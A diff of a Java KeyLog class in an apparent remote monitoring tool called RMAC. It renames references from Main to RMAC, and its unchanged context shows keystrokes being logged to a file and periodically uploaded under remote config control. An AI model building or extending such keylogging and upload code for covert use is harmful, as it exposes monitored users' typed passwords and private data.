@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import com.rmac.utils.NoopOutputStream;
@@ -51,13 +51,13 @@ public class KeyLog implements Runnable {
     this.keyLogFile = new File(Constants.KEYLOG_LOCATION);
     this.buffer = new ArrayList<>();
 
-    if (Main.config.getKeyLogging()) {
+    if (RMAC.config.getKeyLogging()) {
       openFileWriter();
     } else {
       writer = new PrintWriter(new NoopOutputStream());
     }
 
-    Main.config.onChange((prop, value) -> {
+    RMAC.config.onChange((prop, value) -> {
       if ("KeyLog".equals(prop)) {
         boolean val = Boolean.parseBoolean(value);
         if (val) {
@@ -153,10 +153,10 @@ public class KeyLog implements Runnable {
     try {
       while (!Thread.interrupted()) {
         // Wait until it is time to upload the current key-log output file
-        Thread.sleep(Main.config.getKeyLogUploadInterval());
+        Thread.sleep(RMAC.config.getKeyLogUploadInterval());
 
         // If key-logging is disabled via config, no need to upload
-        if (!Main.config.getKeyLogging()) {
+        if (!RMAC.config.getKeyLogging()) {
           continue;
         }
 
@@ -172,7 +172,7 @@ public class KeyLog implements Runnable {
               Paths.get(filePath),
               StandardCopyOption.REPLACE_EXISTING);
           writer = new PrintWriter(new FileWriter(keyLogFile, true));
-          Main.uploader.uploadFile(new File(filePath), ArchiveFileType.KEY);
+          RMAC.uploader.uploadFile(new File(filePath), ArchiveFileType.KEY);
         } catch (IOException e) {
           log.error("Could not move log file to be uploaded", e);
         } finally {
